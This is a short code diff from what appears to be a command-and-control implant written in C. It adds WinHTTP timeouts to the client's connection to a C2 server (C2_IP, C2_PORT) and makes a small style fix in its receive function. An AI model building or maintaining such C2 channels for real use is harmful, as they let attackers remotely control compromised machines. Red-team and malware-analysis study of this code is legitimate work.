@@ -151,6 +151,9 @@ int SetupHTTP() {
         c2_log("[!] SetupComms:WinHttpOpen failed with status %d\n", GetLastError());
         return -1;
     }
+
+    // Set timeout (no timeout for resolve + recv, 60 seconds for connect, 30 seconds for send)
+    WinHttpSetTimeouts(hSession, 0, 60000, 30000, 0);
     
     // Get connection handle (doesnt actually make the connection)
     hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);
@@ -383,7 +386,7 @@ int c2_recv(char* buffer, int len) {
 
     // Get response
     result = WinHttpReceiveResponse(hRequest, NULL);
-    if(!result) {
+    if (!result) {
         c2_log("[!] WinHttpReceiveResponse failed with code %d\n", GetLastError());
         return 0;
     }
